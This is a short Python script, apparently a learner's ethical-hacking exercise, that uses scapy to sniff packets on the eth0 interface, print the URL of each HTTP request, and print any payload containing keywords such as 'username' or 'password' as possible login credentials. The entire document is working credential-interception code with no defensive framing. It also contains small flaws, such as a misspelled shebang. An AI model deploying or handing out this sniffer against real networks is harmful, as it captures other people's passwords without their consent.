#!/usr/bin/evn python

import scapy.all as scapy
from scapy.layers import http


# ftp password = port 21(capture data)
# all web-server or browser run on port 80 by default

def sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)  # prn = its called callback function and those capture's packet exicute another function.


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # we can access the layer by putting
    # SqureBraket[]. and after we can put field


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    # print(packet)
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)

        print("[+]HTTP Request >>" + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")
